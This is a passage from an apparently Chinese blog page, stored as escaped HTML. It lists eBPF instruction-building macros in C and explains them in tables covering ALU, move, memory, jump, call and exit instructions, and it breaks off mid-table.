{&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = SRC,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = OFF,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = 0 })&#xD;&#xA;&#xD;&#xA;/*&#xD;&#xA; * Atomic operations:&#xD;&#xA; *&#xD;&#xA; *   BPF_ADD                  *(uint *) (dst_reg &amp;#43; off16) &amp;#43;= src_reg&#xD;&#xA; *   BPF_AND                  *(uint *) (dst_reg &amp;#43; off16) &amp;amp;= src_reg&#xD;&#xA; *   BPF_OR                   *(uint *) (dst_reg &amp;#43; off16) |= src_reg&#xD;&#xA; *   BPF_XOR                  *(uint *) (dst_reg &amp;#43; off16) ^= src_reg&#xD;&#xA; *   BPF_ADD | BPF_FETCH      src_reg = atomic_fetch_add(dst_reg &amp;#43; off16, src_reg);&#xD;&#xA; *   BPF_AND | BPF_FETCH      src_reg = atomic_fetch_and(dst_reg &amp;#43; off16, src_reg);&#xD;&#xA; *   BPF_OR | BPF_FETCH       src_reg = atomic_fetch_or(dst_reg &amp;#43; off16, src_reg);&#xD;&#xA; *   BPF_XOR | BPF_FETCH      src_reg = atomic_fetch_xor(dst_reg &amp;#43; off16, src_reg);&#xD;&#xA; *   BPF_XCHG                 src_reg = atomic_xchg(dst_reg &amp;#43; off16, src_reg)&#xD;&#xA; *   BPF_CMPXCHG              r0 = atomic_cmpxchg(dst_reg &amp;#43; off16, r0, src_reg)&#xD;&#xA; */&#xD;&#xA;&#xD;&#xA;#define BPF_ATOMIC_OP(SIZE, OP, DST, SRC, OFF)&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_STX | BPF_SIZE(SIZE) | BPF_ATOMIC,&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = SRC,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = OFF,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = OP })&#xD;&#xA;&#xD;&#xA;/* Legacy alias */&#xD;&#xA;#define BPF_STX_XADD(SIZE, DST, SRC, OFF) BPF_ATOMIC_OP(SIZE, BPF_ADD, DST, SRC, OFF)&#xD;&#xA;&#xD;&#xA;/* Memory store, *(uint *) (dst_reg &amp;#43; off16) = imm32 */&#xD;&#xA;&#xD;&#xA;#define BPF_ST_MEM(SIZE, DST, OFF, IMM)&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = OFF,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = IMM })&#xD;&#xA;&#xD;&#xA;/* Conditional jumps against registers, if (dst_reg &amp;#39;op&amp;#39; src_reg) goto pc &amp;#43; off16 */&#xD;&#xA;&#xD;&#xA;#define BPF_JMP_REG(OP, DST, SRC, OFF)&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_JMP | BPF_OP(OP) | BPF_X,&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = SRC,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = OFF,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = 0 })&#xD;&#xA;&#xD;&#xA;/* Like BPF_JMP_REG, but with 32-bit wide operands for comparison. */&#xD;&#xA;&#xD;&#xA;#define BPF_JMP32_REG(OP, DST, SRC, OFF)&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_JMP32 | BPF_OP(OP) | BPF_X,&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = SRC,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = OFF,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = 0 })&#xD;&#xA;&#xD;&#xA;/* Conditional jumps against immediates, if (dst_reg &amp;#39;op&amp;#39; imm32) goto pc &amp;#43; off16 */&#xD;&#xA;&#xD;&#xA;#define BPF_JMP_IMM(OP, DST, IMM, OFF)&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_JMP | BPF_OP(OP) | BPF_K,&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = OFF,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = IMM })&#xD;&#xA;&#xD;&#xA;/* Like BPF_JMP_IMM, but with 32-bit wide operands for comparison. */&#xD;&#xA;&#xD;&#xA;#define BPF_JMP32_IMM(OP, DST, IMM, OFF)&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_JMP32 | BPF_OP(OP) | BPF_K,&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = OFF,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = IMM })&#xD;&#xA;&#xD;&#xA;#define BPF_CALL_FUNC(FUNC) \&#xD;&#xA;&#x9;((struct bpf_insn) {                                    \&#xD;&#xA;&#x9;&#x9;.code = BPF_JMP | BPF_CALL | BPF_K,&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = 0,&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = 0,&#x9;\&#xD;&#xA;&#x9;&#x9;.off = 0, \&#xD;&#xA;&#x9;&#x9;.imm = FUNC })&#xD;&#xA;&#x9;&#x9;&#xD;&#xA;/* Raw code statement block */&#xD;&#xA;&#xD;&#xA;#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = CODE,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = DST,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = SRC,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = OFF,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = IMM })&#xD;&#xA;&#xD;&#xA;/* Program exit */&#xD;&#xA;&#xD;&#xA;#define BPF_EXIT_INSN()&#x9;&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;((struct bpf_insn) {&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.code  = BPF_JMP | BPF_EXIT,&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.dst_reg = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.src_reg = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.off   = 0,&#x9;&#x9;&#x9;&#x9;&#x9;\&#xD;&#xA;&#x9;&#x9;.imm   = 0 })&#xD;&#xA;&#xD;&#xA;#endif&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;alu类&#34;&gt;&lt;span&gt;ALU类&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#alu%e7%b1%bb&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;&lt;strong&gt;宏名称&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;逻辑&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;说明&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;代码示例&lt;/strong&gt;&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_ALU64_REG(OP, DST, SRC)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;dst = dst OP src&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;64位寄存器间运算&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_ALU32_REG(OP, DST, SRC)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;(u32)dst = dst OP src&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;32位寄存器间运算&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_ALU32_REG(BPF_SUB, BPF_REG_1, BPF_REG_2)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_ALU64_IMM(OP, DST, IMM)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;dst = dst OP imm&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;64位寄存器与立即数&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_ALU64_IMM(BPF_MUL, BPF_REG_1, 8)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_ALU32_IMM(OP, DST, IMM)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;(u32)dst = dst OP imm&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;32位寄存器与立即数&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_ALU32_IMM(BPF_XOR, BPF_REG_1, 0xFF)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;&lt;strong&gt;常见 OP&lt;/strong&gt;： &lt;code&gt;BPF_ADD / SUB / MUL / DIV / AND / OR / XOR / LSH / RSH / ARSH&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;ALU32 一定会清零 dst 的高 32 位&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;赋值类&#34;&gt;&lt;span&gt;赋值类&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e8%b5%8b%e5%80%bc%e7%b1%bb&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;&lt;strong&gt;宏名称&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;逻辑&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;说明&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;代码示例&lt;/strong&gt;&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_MOV64_REG(DST, SRC)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;dst = src&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;64位寄存器拷贝&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_MOV64_REG(BPF_REG_1, BPF_REG_0)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_MOV32_REG(DST, SRC)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;(u32)dst = src&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;32位寄存器拷贝&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_MOV32_REG(BPF_REG_1, BPF_REG_0)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_MOV64_IMM(DST, IMM)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;dst = imm32&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;立即数存入64位寄存器&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_MOV64_IMM(BPF_REG_1, 0x1337)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_MOV32_IMM(DST, IMM)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;(u32)dst = imm32&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;立即数存入32位寄存器&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_MOV32_IMM(BPF_REG_1, 1)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;内存读写类&#34;&gt;&lt;span&gt;内存读写类&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%86%85%e5%ad%98%e8%af%bb%e5%86%99%e7%b1%bb&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;&lt;strong&gt;宏名称&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;逻辑&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;说明&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;代码示例&lt;/strong&gt;&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_LDX_MEM(SIZE, DST, SRC, OFF)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;dst = *(size *)(src+off)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Load&lt;/strong&gt;: 内存 -&amp;gt; 寄存器&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_STX_MEM(SIZE, DST, SRC, OFF)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;*(size *)(dst+off) = src&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Store&lt;/strong&gt;: 寄存器 -&amp;gt; 内存&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_STX_MEM(BPF_DW, BPF_REG_1, BPF_REG_0, 8)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_ST_MEM(SIZE, DST, OFF, IMM)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;*(size *)(dst+off) = imm&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;strong&gt;Store&lt;/strong&gt;: 立即数 -&amp;gt; 内存&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_ST_MEM(BPF_W, BPF_REG_1, 0, 0xDEAD)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_LD_IMM64(DST, IMM)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;dst = imm64&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;加载 64 位超长立即数&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_LD_IMM64(BPF_REG_1, 0xFFFF888812345678)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_LD_MAP_FD(DST, MAP_FD)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;dst = map_ptr&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;将 Map 的 FD 转为内存地址&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_LD_MAP_FD(BPF_REG_1, map_fd)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;跳转指令&#34;&gt;&lt;span&gt;跳转指令&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e8%b7%b3%e8%bd%ac%e6%8c%87%e4%bb%a4&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;&lt;strong&gt;宏名称&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;逻辑&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;说明&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;代码示例&lt;/strong&gt;&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_JMP_REG(OP, DST, SRC, OFF)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;if (dst OP src) PC += off&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;寄存器间比较跳转&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_JMP_REG(BPF_JEQ, BPF_REG_0, BPF_REG_1, 2)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_JMP_IMM(OP, DST, IMM, OFF)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;if (dst OP imm) PC += off&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;寄存器与常数比较跳转&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 5)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_CALL_FUNC(FUNC)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;r0 = FUNC(...)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;调用内核辅助函数&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem)&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;h4 class=&#34;heading-element&#34; id=&#34;其他指令&#34;&gt;&lt;span&gt;其他指令&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#%e5%85%b6%e4%bb%96%e6%8c%87%e4%bb%a4&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;&lt;strong&gt;宏名称&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;逻辑&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;说明&lt;/strong&gt;&lt;/th&gt;&#xA;          &lt;th&gt;&lt;strong&gt;代码示例&lt;/strong&gt;&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_EXIT_INSN()&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;return r0&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;结束程序&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_EXIT_INSN()&lt;/code&gt;&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_RAW_INSN(CODE, D, S, O, I)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;(manual)&lt;/code&gt;&lt;/td&gt;&#xA;          &lt;td&gt;手动填充原生指令所有字段&lt;/td&gt;&#xA;          &lt;td&gt;&lt;code&gt;BPF_RAW_INSN(0x07, 1, 